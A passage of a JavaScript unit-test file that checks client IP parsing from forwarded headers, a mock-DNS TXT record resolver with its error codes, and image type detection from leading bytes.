    expect(clientOf(req('203.0.113.9'))).toBe('203.0.113.9');
    expect(clientOf(req('203.0.113.9, 10.0.0.2'))).toBe('203.0.113.9');
    expect(clientOf(req('203.0.113.9:4711'))).toBe('203.0.113.9');
    expect(clientOf(req('2001:db8:1:2:3:4:5:6'))).toBe('2001:db8:1:2::/64');
    expect(clientOf(req('[2001:db8:1:2::9]:443'))).toBe('2001:db8:1:2::/64');
    expect(clientOf(req('::ffff:198.51.100.4'))).toBe('198.51.100.4');
    expect(clientOf(req('nonsense'))).toBe('10.0.0.5');
    expect(clientOf(req(undefined, '::ffff:192.0.2.1'))).toBe('192.0.2.1');
  });

  it('asks the DNS for a TXT record and reads every answer it can give', async () => {
    const dns = await createMockDns();
    try {
      dns.records.set('_ylb-domain.long.example.com', ['ylb-a', 'x'.repeat(600)]);
      dns.records.set('_ylb-domain.empty.example.com', []);
      dns.records.set('_ylb-domain.broken.example.com', 'SERVFAIL');
      const resolveTxt = txtResolver(dns.server);
      expect((await resolveTxt('_ylb-domain.long.example.com')).map((chunks) => chunks.join(''))).toEqual(['ylb-a', 'x'.repeat(600)]);
      await expect(resolveTxt('_ylb-domain.empty.example.com')).rejects.toMatchObject({ code: 'ENODATA' });
      await expect(resolveTxt('_ylb-domain.none.example.com')).rejects.toMatchObject({ code: 'ENOTFOUND' });
      await expect(resolveTxt('_ylb-domain.broken.example.com')).rejects.toMatchObject({ code: 'ESERVFAIL' });
    } finally {
      await dns.close();
    }
  });

  it('knows image types by their first bytes', () => {
    expect(imageTypeOf(PNG)).toBe('image/png');
    expect(imageTypeOf(JPEG)).toBe('image/jpeg');
    expect(imageTypeOf(GIF)).toBe('image/gif');
    expect(imageTypeOf(WEBP)).toBe('image/webp');
    expect(imageTypeOf(Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"></svg>'))).toBeNull();
    expect(imageTypeOf(Buffer.alloc(4))).toBeNull();
  });
});
